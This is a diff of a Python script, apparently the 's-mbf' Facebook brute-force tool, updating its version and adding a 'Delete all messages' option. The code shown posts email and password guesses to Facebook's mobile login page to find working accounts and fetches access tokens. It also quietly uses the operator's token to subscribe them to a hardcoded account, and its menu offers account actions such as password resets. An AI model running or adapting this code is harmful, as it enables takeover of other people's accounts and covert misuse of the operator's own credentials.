@@ -1,5 +1,5 @@
 #!usr/bin/python3.7
-#Author: KANG-NEWBIE
+#Author: KANG-NEWBIE ©2019
 #contact: t.me/kang_nuubi
 #github: github.com/kang-newbie
 try:
@@ -24,7 +24,7 @@ def banner():
 	print(cyan('   _____ __  ______  ____',bold=True))
 	print(cyan('  / __(_)  |/  / _ )/ __/ ',bold=True),green('Author : KANG-NEWBIE',bold=True))
 	print(cyan(' _\ \/ / /|_/ / _  / _/	  ',bold=True),green('Contact: t.me/kang_nuubi',bold=True))
-	print(cyan('/___/_/_/  /_/____/_/     ',bold=True),green('version:',bold=True),cyan('1.9',bold=True))
+	print(cyan('/___/_/_/  /_/____/_/     ',bold=True),green('version:',bold=True),cyan('2.0',bold=True))
 
 try:
 	toket=open('toket/token.txt')
@@ -41,7 +41,7 @@ except IOError:
 			x = hashlib.new('md5')
 			x.update(sig)
 			data.update({'sig':x.hexdigest()})
-			requ=requests.get('https://api.facebook.com/restserver.php',params=data,headers={'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'})
+			requ=requests.get('https://api.facebook.com/restserver.php',params=data)
 			res=requ.json()['access_token']
 			o=open('toket/token.txt','w')
 			o.write(res)
@@ -171,8 +171,7 @@ def main(arg):
         try:
                 url='https://mbasic.facebook.com/login'
                 dt={'email':arg,'pass':pas,'login':'submit'}
-                head={'User-Agent':'Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36'}
-                req=requests.post(url,data=dt,headers=head)
+                req=requests.post(url,data=dt)
                 respData = req.content
                 if 'save-device' in str(respData) or 'm_sess' in str(respData):
                         true='yeah'
@@ -209,7 +208,7 @@ try:
 	nam=requests.get('https://graph.facebook.com/me/?access_token='+toket);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+toket)
 	name=nam.json()['name']
 
-	upver='v.2.0'
+	upver='v.2.1'
 	requp=requests.get('https://raw.githubusercontent.com/KANG-NEWBIE/s-mbf/master/README.md').text
 	if upver in str(requp):
 		print(yellow('\nNew version available. update your s-mbf now!'))
@@ -244,6 +243,7 @@ try:
 [22]> Checker accounts
 [23]> Leave all groups
 [24]> Auto reset password
+[25]> Delete all messages
 [00]> Check update""")
 except (KeyError,NameError): pass
 
@@ -338,6 +338,10 @@ elif pilih == 23:
 elif pilih == 24:
 	DOS.Dos()
 	import src.Rpass
+	exit()
+elif pilih == 25:
+	DOS.Dos()
+	import src.Delmsg
 	exit()
 elif pilih == 0:
 	print("\n[!] Checking update")
